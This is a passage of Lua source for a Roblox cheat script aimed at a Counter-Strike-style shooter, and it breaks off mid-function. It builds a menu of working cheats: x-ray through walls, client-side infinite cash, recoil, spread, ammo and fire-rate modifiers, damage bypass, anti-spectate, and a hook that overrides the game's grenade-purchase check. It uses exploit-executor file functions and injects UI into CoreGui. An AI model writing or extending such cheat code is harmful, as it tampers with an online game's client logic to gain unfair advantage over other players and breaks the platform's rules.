world:Element("ToggleTrans", "molly radius", {default = {Color = C.COL3RGB(255,0,0)}}, function(tbl) 
	if workspace.Ray_Ignore:FindFirstChild("Fires") == nil then return end 
	if tbl.Toggle then 
		for i,fire in pairs(workspace.Ray_Ignore:FindFirstChild("Fires"):GetChildren()) do 
			fire.Transparency = tbl.Transparency 
			fire.Color = tbl.Color 
		end 
	else 
		for i,fire in pairs(workspace.Ray_Ignore:FindFirstChild("Fires"):GetChildren()) do 
			fire.Transparency = 1 
		end 
	end 
end) 
world:Element("ToggleColor", "smoke radius", {default = {Color = C.COL3RGB(0, 255, 0)}}, function(tbl) 
	if workspace.Ray_Ignore:FindFirstChild("Smokes") == nil then return end 
	if tbl.Toggle then 
		for i,smoke in pairs(workspace.Ray_Ignore:FindFirstChild("Smokes"):GetChildren()) do 
			smoke.Transparency = 0 
			smoke.Color = tbl.Color 
		end 
	else 
		for i,smoke in pairs(workspace.Ray_Ignore:FindFirstChild("Smokes"):GetChildren()) do 
			smoke.Transparency = 1 
		end 
	end 
end)
world:Element('Dropdown', 'Tracers', {options = {'BS', 'Line'}})
world:Element("ToggleColor", "bullet tracers", {default = {Color = C.COL3RGB(255, 255, 255)}}) 
world:Element('Slider', 'Duration', {min = 0, max = 10, default = 0.5})
local Folder = C.INST("Folder")
	Folder.Parent = game:GetService("Workspace")

	local Settings = {
		StartColor = C.COL3(1, 1, 1),
		EndColor = C.COL3(1, 0, 0),
		StartWidth = 0.63,
		EndWidth = 0.63,
		ShowImpactPoint = false,
		ImpactTransparency = 0,
		ImpactColor = C.COL3(1, 1, 1),
		Time = values.visuals.world['Duration'].Slider
	}
	local funcs = {}
	function createbullettracer(v1, v2)
		local colorSequence = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Settings.StartColor),
			ColorSequenceKeypoint.new(1, Settings.EndColor),
		})
	local Part = C.INST("Part")
	Part.CanCollide = false
	Part.CFrame = C.CF(v1)
	Part.Size = C.Vec3(0, 0, 0)
	Part.TopSurface = Enum.SurfaceType.Smooth
	Part.Parent = Folder
	Part.Transparency = Settings.ShowImpactPoint and Settings.ImpactTransparency or 1
	Part.Anchored = true


	local Part2 = C.INST("Part")

	Part2.CFrame = C.CF(v2)
	Part2.Size = C.Vec3(0, 0, 0)
	Part2.Transparency = Settings.ShowImpactPoint and Settings.ImpactTransparency or 1
	Part2.Parent = Folder
	Part2.Anchored = true
	Part2.CanCollide = false
		
	local Object1 = C.INST("Attachment")
	Object1.Name = "1"
	Object1.Parent = Part

	local Object2 = C.INST("Attachment")
	Object2.Name = "2"
	Object2.Parent = Part2

	local Beam = C.INST("Beam")
	Beam.Attachment0 = Object1
	Beam.Attachment1 = Object2
	Beam.LightInfluence = 1
	Beam.Texture = values.visuals.world["Tracers"].Dropdown == "Line" and "rbxassetid://4872917021" or values.visuals.world["Tracers"].Dropdown == "BS" and "rbxassetid://446111271"
	Beam.Parent = Folder
	Beam.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, values.visuals.world["bullet tracers"].Color), ColorSequenceKeypoint.new(1, values.visuals.world["bullet tracers"].Color)}
	delay(Settings.Time, function()
		for i = 0.5, 1, 0.02 do
			wait()
			Beam.Transparency = NumberSequence.new(i)
		end
		Part:Destroy()
		Part2:Destroy()
	end)
	end
world:Element("Slider", "time changer", {min = 0, max = 15, default = 0}, function(tbl)
         game.Lighting.ClockTime = tbl.Slider

end)


world:Element("ToggleColor", "impacts", {default = {Color = C.COL3RGB(255, 0, 0)}}) 
world:Element("ToggleColor", "hit chams", {default = {Color = C.COL3RGB(0, 0, 255)}}) 
world:Element("Dropdown", "hitsound", {options = {"none", "skeet", "neverlose", "rust", "bag", "baimware", "osu", "Tf2", "Tf2 pan", "M55solix", "Slap", "1", "Minecraft", "jojo", "vibe", "supersmash", "epic", "retro", "quek", "SEMI"}}) 
world:Element("Slider", "sound volume", {min = 1, max = 5, default = 3}) 
world:Element("Dropdown", "skybox", {options = {"none", "nebula", "vaporwave", "clouds"}}, function(tbl) 
	local sky = tbl.Dropdown 
	if sky ~= "none" then 
		if Lighting:FindFirstChildOfClass("Sky") then Lighting:FindFirstChildOfClass("Sky"):Destroy() end 
		local skybox = C.INST("Sky") 
		skybox.SkyboxLf = Skyboxes[sky].SkyboxLf 
		skybox.SkyboxBk = Skyboxes[sky].SkyboxBk 
		skybox.SkyboxDn = Skyboxes[sky].SkyboxDn 
		skybox.SkyboxFt = Skyboxes[sky].SkyboxFt 
		skybox.SkyboxRt = Skyboxes[sky].SkyboxRt 
		skybox.SkyboxUp = Skyboxes[sky].SkyboxUp 
		skybox.Name = "override" 
		skybox.Parent = Lighting 
	else 
		if Lighting:FindFirstChildOfClass("Sky") then Lighting:FindFirstChildOfClass("Sky"):Destroy() end 
		if oldSkybox ~= nil then oldSkybox:Clone().Parent = Lighting end 
	end 
end) 
--[[world:Element("ToggleColor", "item esp", {default = {Color = C.COL3RGB(255, 255, 255)}}, function(tbl) 
	for i,weapon in pairs(workspace.Debris:GetChildren()) do 
		if weapon:IsA("BasePart") and Weapons:FindFirstChild(weapon.Name) then 
			weapon.BillboardGui.ImageLabel.Visible = tbl.Toggle and C.TBLFIND(values.visuals.world["types"].Jumbobox, "icon") and true or false 
		end 
	end 
end) 
world:Element("Jumbobox", "types", {options = {"icon"}}, function(tbl) 
	for i,weapon in pairs(workspace.Debris:GetChildren()) do 
		if weapon:IsA("BasePart") and Weapons:FindFirstChild(weapon.Name) then 
			weapon.BillboardGui.ImageLabel.Visible = values.visuals.world["item esp"].Toggle and C.TBLFIND(tbl.Jumbobox, "icon") and true or false 
			weapon.BillboardGui.ImageLabel.ImageColor3 = values.visuals.world["item esp"].Color 
		end 
	end 
end) --]]
local configs = misc:Sector("configs", "Left") 
configs:Element("TextBox", "config", {placeholder = "config name"}) -- values.misc.configs.config.Text
configs:Element("Button", "save new cfg", {}, function() 
	if values.misc.configs.config.Text ~= "" then 
		library:SaveConfig(values.misc.configs.config.Text) 
		insertwithoutdupes(allcfgs, ""..values.misc.configs.config.Text..".txt")
	end
	ConfigUpdateCfgList2:Fire()
	ConfigUpdateCfgList:Fire()
end) 
configs:Element("Button", "load", {}, function() 
	ConfigLoad:Fire(values.misc["configs"].config.Text)
end)
configs:Element("cfgtype", "cfgs", {options = allcfgs, Amount = 5})
configs:Element("Button", "load from list", {}, function() 
	ConfigLoad1:Fire(values.misc.configs.cfgs.Scroll)
end)
configs:Element("Button", "Update cfg in list", {}, function()
	library:SaveConfig1(values.misc["configs"].cfgs.Scroll)
end)
configs:Element("Button", "Refresh cfg list", {}, function()
table.clear(allcfgs)

for _,cfg in pairs(listfiles('SamuelPaste/cfgs')) do 
	local cfgname = C.GSUB(cfg, 'SamuelPaste/cfgs\\', "") 
	C.INSERT(allcfgs, cfgname) 
end
	ConfigUpdateCfgList2:Fire()
	ConfigUpdateCfgList:Fire()
end)
configs:Element("Button", 'overwrite cfgs from old folder', {}, function()
	--[[for _,cfg in pairs(listfiles("pastedstormy/pastedstormycfgs")) do 
		local cfgname = C.GSUB(cfg, "pastedstormy/pastedstormycfgs\\", "") 
		writefile(cfglocation..cfgname, readfile(cfg))
	end--]]
	for _,cfg in pairs(listfiles("pastedstormy/pastedstormycfgs")) do 
		local cfgname = C.GSUB(cfg, "pastedstormy/pastedstormycfgs\\", "") 
		writefile('SamuelPaste/cfgs/'..cfgname, readfile(cfg))
	end
	table.clear(allcfgs)

	for _,cfg in pairs(listfiles(cfglocation)) do 
		local cfgname = C.GSUB(cfg, cfglocation.."\\", "") 
		C.INSERT(allcfgs, cfgname) 
	end
		ConfigUpdateCfgList2:Fire()
		ConfigUpdateCfgList:Fire()
end)

configs:Element("Toggle", "keybind list", nil, function(tbl) 
	library:SetKeybindVisible(tbl.Toggle) 
end) 
		configs:Element("Toggle", "specators list", {}, function(tbl)
			library:SetSpectatorVisible(tbl.Toggle) 
		end)
			configs:Element("Toggle", "keystrokes", {}, function(tbl)
				if tbl.Toggle then
						 local ScreenGuiKey = C.INST("ScreenGui")
			local W = C.INST("TextLabel")
			local A = C.INST("TextLabel")
			local S = C.INST("TextLabel")
			local D = C.INST("TextLabel")
			local E = C.INST("TextLabel")
			local R = C.INST("TextLabel")
			local _ = C.INST("TextLabel")
			local _2 = C.INST("TextLabel")
			local _3 = C.INST("TextLabel")
			local _4 = C.INST("TextLabel")
			local _5 = C.INST("TextLabel")
			local _6 = C.INST("TextLabel")


			ScreenGuiKey.Parent = game.CoreGui
			ScreenGuiKey.Name = "keystrokess"

			W.Name = "W"
			W.Parent = ScreenGuiKey
			W.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			W.BackgroundTransparency = 1.000
			W.Position = C.UDIM2(0.488053292, 0, 0.728395104, 0)
			W.Size = C.UDIM2(0, 29, 0, 28)
			W.Visible = false
			W.Font = Enum.Font.Code
			W.Text = "W"
			W.TextColor3 = C.COL3RGB(255, 255, 255)
			W.TextSize = 14.000
			W.TextStrokeTransparency = 0.000
			
			_.Name = "_"
			_.Parent = ScreenGuiKey
			_.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_.BackgroundTransparency = 1.000
			_.Position = C.UDIM2(0.488053292, 0, 0.728395104, 0)
			_.Size = C.UDIM2(0, 29, 0, 28)
			_.Visible = true
			_.Font = Enum.Font.Code
			_.Text = "_"
			_.TextColor3 = C.COL3RGB(255, 255, 255)
			_.TextSize = 14.000
			_.TextStrokeTransparency = 0.000

			A.Name = "A"
			A.Parent = ScreenGuiKey
			A.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			A.BackgroundTransparency = 1.000
			A.Position = C.UDIM2(0.453584045, 0, 0.777777791, 0)
			A.Size = C.UDIM2(0, 29, 0, 28)
			A.Visible = false
			A.Font = Enum.Font.Code
			A.Text = "A"
			A.TextColor3 = C.COL3RGB(255, 255, 255)
			A.TextSize = 14.000
			A.TextStrokeTransparency = 0.000
			
			_2.Name = "_2"
			_2.Parent = ScreenGuiKey
			_2.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_2.BackgroundTransparency = 1.000
			_2.Position = C.UDIM2(0.453584045, 0, 0.777777791, 0)
			_2.Size = C.UDIM2(0, 29, 0, 28)
			_2.Visible = true
			_2.Font = Enum.Font.Code
			_2.Text = "_"
			_2.TextColor3 = C.COL3RGB(255, 255, 255)
			_2.TextSize = 14.000
			_2.TextStrokeTransparency = 0.000

			S.Name = "S"
			S.Parent = ScreenGuiKey
			S.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			S.BackgroundTransparency = 1.000
			S.Position = C.UDIM2(0.488053292, 0, 0.777777791, 0)
			S.Size = C.UDIM2(0, 29, 0, 28)
			S.Visible = false
			S.Font = Enum.Font.Code
			S.Text = "S"
			S.TextColor3 = C.COL3RGB(255, 255, 255)
			S.TextSize = 14.000
			S.TextStrokeTransparency = 0.000
			
			_3.Name = "_3"
			_3.Parent = ScreenGuiKey
			_3.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_3.BackgroundTransparency = 1.000
			_3.Position = C.UDIM2(0.488053292, 0, 0.777777791, 0)
			_3.Size = C.UDIM2(0, 29, 0, 28)
			_3.Visible = true
			_3.Font = Enum.Font.Code
			_3.Text = "_"
			_3.TextColor3 = C.COL3RGB(255, 255, 255)
			_3.TextSize = 14.000
			_3.TextStrokeTransparency = 0.000

			D.Name = "D"
			D.Parent = ScreenGuiKey
			D.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			D.BackgroundTransparency = 1.000
			D.Position = C.UDIM2(0.522522688, 0, 0.777777791, 0)
			D.Size = C.UDIM2(0, 29, 0, 28)
			D.Visible = false
			D.Font = Enum.Font.Code
			D.Text = "D"
			D.TextColor3 = C.COL3RGB(255, 255, 255)
			D.TextSize = 14.000
			D.TextStrokeTransparency = 0.000
			
			_4.Name = "_4"
			_4.Parent = ScreenGuiKey
			_4.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_4.BackgroundTransparency = 1.000
			_4.Position = C.UDIM2(0.522522688, 0, 0.777777791, 0)
			_4.Size = C.UDIM2(0, 29, 0, 28)
			_4.Visible = true
			_4.Font = Enum.Font.Code
			_4.Text = "_"
			_4.TextColor3 = C.COL3RGB(255, 255, 255)
			_4.TextSize = 14.000
			_4.TextStrokeTransparency = 0.000

			E.Name = "E"
			E.Parent = ScreenGuiKey
			E.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			E.BackgroundTransparency = 1.000
			E.Position = C.UDIM2(0.453584045, 0, 0.728395045, 0)
			E.Size = C.UDIM2(0, 29, 0, 28)
			E.Visible = false
			E.Font = Enum.Font.Code
			E.Text = "C"
			E.TextColor3 = C.COL3RGB(255, 255, 255)
			E.TextSize = 14.000
			E.TextStrokeTransparency = 0.000
			
			_5.Name = "_5"
			_5.Parent = ScreenGuiKey
			_5.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_5.BackgroundTransparency = 1.000
			_5.Position = C.UDIM2(0.453584045, 0, 0.728395045, 0)
			_5.Size = C.UDIM2(0, 29, 0, 28)
			_5.Visible = true
			_5.Font = Enum.Font.Code
			_5.Text = "_"
			_5.TextColor3 = C.COL3RGB(255, 255, 255)
			_5.TextSize = 14.000
			_5.TextStrokeTransparency = 0.000

			R.Name = "R"
			R.Parent = ScreenGuiKey
			R.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			R.BackgroundTransparency = 1.000
			R.Position = C.UDIM2(0.522522688, 0, 0.728395045, 0)
			R.Size = C.UDIM2(0, 29, 0, 28)
			R.Visible = false
			R.Font = Enum.Font.Code
			R.Text = "J"
			R.TextColor3 = C.COL3RGB(255, 255, 255)
			R.TextSize = 14.000
			R.TextStrokeTransparency = 0.000
			
			_6.Name = "_6"
			_6.Parent = ScreenGuiKey
			_6.BackgroundColor3 = C.COL3RGB(255, 255, 255)
			_6.BackgroundTransparency = 1.000
			_6.Position = C.UDIM2(0.522522688, 0, 0.728395045, 0)
			_6.Size = C.UDIM2(0, 29, 0, 28)
			_6.Visible = true
			_6.Font = Enum.Font.Code
			_6.Text = "_"
			_6.TextColor3 = C.COL3RGB(255, 255, 255)
			_6.TextSize = 14.000
			_6.TextStrokeTransparency = 0.000
	 

			local UserInputService = game:GetService("UserInputService")

			local W1Key = Enum.KeyCode.W
			local A1Key = Enum.KeyCode.A
			local S1Key = Enum.KeyCode.S
			local D1Key = Enum.KeyCode.D
			local E1Key = Enum.KeyCode.LeftControl
			local R1Key = Enum.KeyCode.R
			local SpaceKey = Enum.KeyCode.Space

			UserInputService.InputBegan:Connect(function(input)
				if (input.KeyCode == W1Key) then
					W.Visible = true
					_.Visible = false
				elseif (input.KeyCode == A1Key) then
					A.Visible = true
					_2.Visible = false
				elseif (input.KeyCode == S1Key) then
					S.Visible = true
					_3.Visible = false
				elseif (input.KeyCode == D1Key) then
					D.Visible = true
					_4.Visible = false
				elseif (input.KeyCode == E1Key) then
					E.Visible = true
					_5.Visible = false
				elseif (input.KeyCode == SpaceKey) then
					R.Visible = true
					_6.Visible = false
				end
			end)

			UserInputService.InputEnded:Connect(function(input)
				if (input.KeyCode == W1Key) then
					W.Visible = false
					_.Visible = true
				elseif (input.KeyCode == A1Key) then
					A.Visible = false
					_2.Visible = true
				elseif (input.KeyCode == S1Key) then
					S.Visible = false
					_3.Visible = true
				elseif (input.KeyCode == D1Key) then
					D.Visible = false
					_4.Visible = true
				elseif (input.KeyCode == E1Key) then
					E.Visible = false
					_5.Visible = true	
				elseif (input.KeyCode == SpaceKey) then
					R.Visible = false
					_6.Visible = true
				end
			end)		
			else
			game.CoreGui.keystrokess:Destroy()
			end
			end)



local crosshaireditor = misc:Sector("crosshair editor", "Right") 
local function UpdateCrosshair() 
	if values.misc["crosshair editor"].enabled.Toggle then 
		local length = values.misc["crosshair editor"].length.Slider 
		PlayerGui.GUI.Crosshairs.Crosshair.LeftFrame.Size = C.UDIM2(0, length, 0, 2) 
		PlayerGui.GUI.Crosshairs.Crosshair.RightFrame.Size = C.UDIM2(0, length, 0, 2) 
		PlayerGui.GUI.Crosshairs.Crosshair.TopFrame.Size = C.UDIM2(0, 2, 0, length) 
		PlayerGui.GUI.Crosshairs.Crosshair.BottomFrame.Size = C.UDIM2(0, 2, 0, length) 
		for _,frame in pairs(PlayerGui.GUI.Crosshairs.Crosshair:GetChildren()) do 
			if C.FIND(frame.Name, "Frame") then 
				frame.BorderColor3 = C.COL3(0,0,0) 
				if values.misc["crosshair editor"].border.Toggle then 
					frame.BorderSizePixel = 1 
				else 
					frame.BorderSizePixel = 0 
				end 
			end 
		end 
	else 
		PlayerGui.GUI.Crosshairs.Crosshair.LeftFrame.Size = C.UDIM2(0, 10, 0, 2) 
		PlayerGui.GUI.Crosshairs.Crosshair.RightFrame.Size = C.UDIM2(0, 10, 0, 2) 
		PlayerGui.GUI.Crosshairs.Crosshair.TopFrame.Size = C.UDIM2(0, 2, 0, 10) 
		PlayerGui.GUI.Crosshairs.Crosshair.BottomFrame.Size = C.UDIM2(0, 2, 0, 10) 
		for _,frame in pairs(PlayerGui.GUI.Crosshairs.Crosshair:GetChildren()) do 
			if C.FIND(frame.Name, "Frame") then 
				frame.BorderSizePixel = 0 
			end 
		end 
	end 
end 
crosshaireditor:Element("Toggle", "enabled", nil, UpdateCrosshair) 
crosshaireditor:Element("Slider", "length", {min = 1, max = 15, default = 10}, UpdateCrosshair) 
crosshaireditor:Element("Toggle", "border", nil, UpdateCrosshair) 

local client = misc:Sector("client", "Right") 
client:Element('Toggle', 'auto join team')
client:Element('Dropdown', 'team', {options = {'CT', 'T'}})



client:Element("Toggle", "infinite cash", nil, function(tbl) 
	if tbl.Toggle then 
		LocalPlayer.Cash.Value = 90000000000 
	end 
end) 
client:Element("Toggle", "infinite crouch") 
client:Element("Jumbobox", "damage bypass", {options = {"fire", "fall"}}) 
client:Element("Jumbobox", "gun modifiers", {options = {"recoil", "spread", "reload", "equip", "ammo", "automatic", "penetration", "firerate"}}) 
client:Element("Toggle", "remove killers", {}, function(tbl) 
	if tbl.Toggle then 
		if workspace:FindFirstChild("Map") and workspace:FindFirstChild("Map"):FindFirstChild("Killers") then 
			local clone = workspace:FindFirstChild("Map"):FindFirstChild("Killers"):Clone() 
			clone.Name = "KillersClone" 
			clone.Parent = workspace:FindFirstChild("Map") 

			workspace:FindFirstChild("Map"):FindFirstChild("Killers"):Destroy() 
		end 
	else 
		if workspace:FindFirstChild("Map") and workspace:FindFirstChild("Map"):FindFirstChild("KillersClone") then 
			workspace:FindFirstChild("Map"):FindFirstChild("KillersClone").Name = "Killers" 
		end 
	end 
end) 
client:Element("ToggleColor", "hitmarker", {default = {Color = C.COL3RGB(255,255,255)}}) 
client:Element("ToggleColor", "hitlogs", {default = {Color = MainUIColor}})
client:Element('Slider', 'log time', {min = 1, max = 10, default = 2})
client:Element("Toggle", "buy any grenade") 
client:Element("Toggle", "chat alive") 
client:Element("Jumbobox", "shop", {options = {"inf time", "anywhere"}}) 
client:Element("Toggle", "anti spectate") 
client:Element("Toggle", "upside down spectate")
		local zuhnmode = C.INST("ColorCorrectionEffect", workspace.CurrentCamera)
				client:Element("Toggle", "Boost Saturation", {}, function(tbl)
					if tbl.Toggle then
						zuhnmode.Saturation = 1.4
				else
				zuhnmode.Saturation = 0
				end
				end)
function IsAlive(plr)
    return (plr and plr.Character and plr.Character:FindFirstChild("Head") and plr.Status.Alive.Value == true and true) or false
end




client:Element("Toggle", "x-ray", {}, function(tbl)
if tbl.Toggle then
		for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0.5
			end
		end
else
			for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
				i.LocalTransparencyModifier = 0
			end
		end
end
end)




local oldgrenadeallowed = Client.grenadeallowed 
Client.grenadeallowed = function(...) 
	if values.misc.client["buy any grenade"].Toggle then 
		return true 
	end 

	return oldgrenadeallowed(...) 
end 


client:Element("Toggle", "old sounds", {}, function(tbl)
if tbl.Toggle then
--maked by encgldapp, remaked by erog, that script has all bolt shoot etc sounds from cb 2018 (no dual berretas because im gay), enjoy! :) (ion is hot)

local oldsounds
oldsounds = RunService.RenderStepped:Connect(function()
if not (tbl.Toggle) then oldsounds:Disconnect() return end
	pcall(function()
		local player = game:GetService("Players").LocalPlayer.Character
		if player.EquippedTool.Value == "AK47" then
			player.Gun.Shoot.SoundId = "rbxassetid://168436671"
			player.Gun.bolt.SoundId = "rbxassetid://1684275289"
			player.Gun.boltin.SoundId = "rbxassetid://3599995642"
			player.Gun.boltrelease.SoundId = "rbxassetid://515216512"
			player.Gun.magin.SoundId = "rbxassetid://1684275593"
			player.Gun.magout.SoundId = "rbxassetid://1684275849"
		end
		if player.EquippedTool.Value == "M4A1" then
			player.Gun.SShoot.SoundId = "rbxassetid://1665639883"
			player.Gun.Equip.SoundId = "rbxassetid://6564247176"
        	player.Gun.Remove.SoundId = "rbxassetid://1665639103"
			player.Gun.Shoot.SoundId = "rbxassetid://223013951"
			player.Gun.Apply.SoundId = "rbxassetid://1665639351"
			player.Gun.Turn1.SoundId = "rbxassetid://925145888"
			player.Gun.Turn2.SoundId = "rbxassetid://925145967"
			player.Gun.Turn3.SoundId = "rbxassetid://925146060"
			player.Gun.Turn4.SoundId = "rbxassetid://925146170"
			player.Gun.Turn5.SoundId = "rbxassetid://925146323"
			player.Gun.Turn6.SoundId = "rbxassetid://925146323"
			player.Gun.Turn7.SoundId = "rbxassetid://925146323"
			player.Gun.bolt.SoundId = "rbxassetid://1684291592"
			player.Gun.boltin.SoundId = "rbxassetid://1684291797"
			player.Gun.boltrelease.SoundId = "rbxassetid://1684291797"
			player.Gun.magin.SoundId = "rbxassetid://1684292119"
			player.Gun.magout.SoundId = "rbxassetid://1684292401"
		end
        if player.EquippedTool.Value == "Glock" then
			player.Gun.Shoot.SoundId = "rbxassetid://1665635507"
			player.Gun.Switch.SoundId = "rbxassetid://240962650"
			player.Gun.maghit.SoundId = "rbxassetid://888771897"
			player.Gun.magin.SoundId = "rbxassetid://1684288365"
			player.Gun.magout.SoundId = "rbxassetid://1684288526"
			player.Gun.slide.SoundId = "rbxassetid://1684288735"
			player.Gun.slidein.SoundId = "rbxassetid://1684289044"
		end
		if player.EquippedTool.Value == "Galil" then
			player.Gun.Shoot.SoundId = "rbxassetid://344800912"
			player.Gun.Equip.SoundId = "rbxassetid://1665634238"
			player.Gun.bolt.SoundId = "rbxassetid://1684286891"
			player.Gun.boltin.SoundId = "rbxassetid://1684287138"
			player.Gun.magin.SoundId = "rbxassetid://1684287952"
			player.Gun.magout.SoundId = "rbxassetid://1684288128"
		end
		if player.EquippedTool.Value == "USP" then
			player.Gun.SShoot.SoundId = "rbxassetid://1112952739"
			player.Gun.Shoot.SoundId = "rbxassetid://1665652648"
			player.Gun.apply.SoundId = "rbxassetid://1665639351"
			player.Gun.magin.SoundId = "rbxassetid://206942341"
			player.Gun.magout.SoundId = "rbxassetid://206942338"
			player.Gun.remove.SoundId = "rbxassetid://1665639103"
			player.Gun.slide.SoundId = "rbxassetid://223013136"
			player.Gun.slidein.SoundId = "rbxassetid://206942322"
			player.Gun.turn1.SoundId = "rbxassetid://936530480"
			player.Gun.turn2.SoundId = "rbxassetid://936530564"
			player.Gun.turn3.SoundId = "rbxassetid://936530659"
			player.Gun.turn4.SoundId = "rbxassetid://936530800"
			player.Gun.turn5.SoundId = "rbxassetid://936530926"
			player.Gun.turn6.SoundId = "rbxassetid://936530926"
			player.Gun.turn7.SoundId = "rbxassetid://936530926"
		end
		if player.EquippedTool.Value == "DualBerettas" then 
			player.Gun1.Shoot.SoundId = "rbxassetid://251030881"
			player.Gun2.Shoot.SoundId = "rbxassetid://251030881"
		end
		if player.EquippedTool.Value == "P250" then
			player.Gun.Shoot.SoundId = "rbxassetid://340365431"
            player.Gun.Shoot.TimePosition = 0
			player.Gun.magin.SoundId = "rbxassetid://1684297881"
			player.Gun.magout.SoundId = "rbxassetid://1684298091"
			player.Gun.slide.SoundId = "rbxassetid://1684298337"
			player.Gun.slidein.SoundId = "rbxassetid://1684298585"
		end
		if player.EquippedTool.Value == "DesertEagle" then
			player.Gun.Shoot.SoundId = "rbxassetid://202918645"
			player.Gun.Equip.SoundId = "rbxassetid://223012521"
			player.Gun.magin.SoundId = "rbxassetid://1684279318"
			player.Gun.magout.SoundId = "rbxassetid://1684279591"
			player.Gun.slide.SoundId = "rbxassetid://1684279824"
			player.Gun.slidein.SoundId = "rbxassetid://1684280102"
		end
		if player.EquippedTool.Value == "M249" then
			player.Gun.Shoot.SoundId = "rbxassetid://193868290"
			player.Gun.bolt.SoundId = "rbxassetid://1158042711"
			player.Gun.boltin.SoundId = "rbxassetid://1158042903"
			player.Gun.boxin.SoundId = "rbxassetid://1158045048"
			player.Gun.boxout.SoundId = "rbxassetid://1158045203"
			player.Gun.bullets.SoundId = "rbxassetid://1158043093"
			player.Gun.close.SoundId = "rbxassetid://1158044531"
			player.Gun.open.SoundId = "rbxassetid://1158044816"
		end
		if player.EquippedTool.Value == "MP9" then
			player.Gun.Shoot.SoundId = "rbxassetid://222888810"
			player.Gun.bolt.SoundId = "rbxassetid://1684295316"
			player.Gun.boltin.SoundId = "rbxassetid://1684295598"
			player.Gun.magin.SoundId = "rbxassetid://1684294512"
			player.Gun.magout.SoundId = "rbxassetid://1684294744"
		end
		if player.EquippedTool.Value == "UMP" then
			player.Gun.Shoot.SoundId = "rbxassetid://206953341"
			player.Gun.bolt.SoundId = "rbxassetid://1684306766"
			player.Gun.boltin.SoundId = "rbxassetid://1684285841"
			player.Gun.magin.SoundId = "rbxassetid://1684306283"
			player.Gun.magout.SoundId = "rbxassetid://1684306521"
		end
		if player.EquippedTool.Value == "P90" then
			player.Gun.Shoot.SoundId = "rbxassetid://1665644012"
			player.Gun.bolt.SoundId = "rbxassetid://1684297105"
			player.Gun.boltin.SoundId = "rbxassetid://1684297300"
			player.Gun.maghit.SoundId = "rbxassetid://1684296035"
			player.Gun.magin.SoundId = "rbxassetid://1684296357"
			player.Gun.magout.SoundId = "rbxassetid://1684296652"
		end
		if player.EquippedTool.Value == "Bizon" then
			player.Gun.Equip.SoundId = "rbxassetid://485606203"
			player.Gun.Shoot.SoundId = "rbxassetid://1544325366"
			player.Gun.bolt.SoundId = "rbxassetid://1183581141"
			player.Gun.boltin.SoundId = "rbxassetid://1544325072"
			player.Gun.magin.SoundId = "rbxassetid://1505933747"
			player.Gun.magout.SoundId = "rbxassetid://1505933951"
		end
		if player.EquippedTool.Value == "Famas" then
			player.Gun.Shoot.SoundId = "rbxassetid://206953280"
			player.Gun.Switch.SoundId = "rbxassetid://240962650"
			player.Gun.bolt.SoundId = "rbxassetid://1684281554"
			player.Gun.boltin.SoundId = "rbxassetid://1684281882"
			player.Gun.maghit.SoundId = "rbxassetid://1684282232"
			player.Gun.magin.SoundId = "rbxassetid://1684282468"
			player.Gun.magout.SoundId = "rbxassetid://1684284000"
		end
		if player.EquippedTool.Value == "Scout" then
			player.Gun.Shoot.SoundId = "rbxassetid://2476571739"
			player.Gun.bolt.SoundId = "rbxassetid://516399716"
			player.Gun.boltin.SoundId = "rbxassetid://516399736"
			player.Gun.maghit.SoundId = "rbxassetid://516399754"
			player.Gun.magin.SoundId = "rbxassetid://516399767"
			player.Gun.magout.SoundId = "rbxassetid://516399791"
            player.Gun.Zoom.SoundId = "rbxassetid://2862871544"
            player.Gun.Zoom.PlaybackSpeed = 1
		end
		if player.EquippedTool.Value == "AUG" then
			player.Gun.Shoot.SoundId = "rbxassetid://1657593449"
			player.Gun.bolt.SoundId = "rbxassetid://1684276056"
			player.Gun.boltin.SoundId = "rbxassetid://1684276387"
			player.Gun.maghit.SoundId = "rbxassetid://1684276669"
			player.Gun.magin.SoundId = "rbxassetid://1684276943"
			player.Gun.magout.SoundId = "rbxassetid://1684277138"
		end
		if player.EquippedTool.Value == "AWP" then
			player.Gun.Shoot.SoundId = "rbxassetid://1112948895"
			player.Gun.bolt.SoundId = "rbxassetid://1684277591"
			player.Gun.boltin.SoundId = "rbxassetid://1684277363"
			player.Gun.maghit.SoundId = "rbxassetid://1684277814"
			player.Gun.magin.SoundId = "rbxassetid://1684278055"
			player.Gun.magout.SoundId = "rbxassetid://1684278254"
            player.Gun.Zoom.SoundId = "rbxassetid://2862871544"
            player.Gun.Zoom.PlaybackSpeed = 1
		end
		if player.EquippedTool.Value == "G3SG1" then
			player.Gun.Shoot.SoundId = "rbxassetid://340365815"
			player.Gun.bolt.SoundId = "rbxassetid://1684285559"
			player.Gun.boltin.SoundId = "rbxassetid://1684285841"
			player.Gun.maghit.SoundId = "rbxassetid://777244606"
			player.Gun.magin.SoundId = "rbxassetid://1684286087"
			player.Gun.magout.SoundId = "rbxassetid://1684286303"
	    player.Gun.Zoom.SoundId = "rbxassetid://1684300267"
            player.Gun.Zoom.PlaybackSpeed = 1
		end
		if player.EquippedTool.Value == "MAC10" then
			player.Gun.Shoot.SoundId = "rbxassetid://242422782"
			player.Gun.bolt.SoundId = "rbxassetid://1684293112"
			player.Gun.boltin.SoundId = "rbxassetid://1684293359"
			player.Gun.maghit.SoundId = "rbxassetid://1183581737"
			player.Gun.magin.SoundId = "rbxassetid://1684292666"
			player.Gun.magout.SoundId = "rbxassetid://1684292928"
		end
		if player.EquippedTool.Value == "SawedOff" then
			player.Gun.Shoot.SoundId = "rbxassetid://1158047483"
			player.Gun.bolt.SoundId = "rbxassetid://222889105"
			player.Gun.insert1.SoundId = "rbxassetid://1657167530"
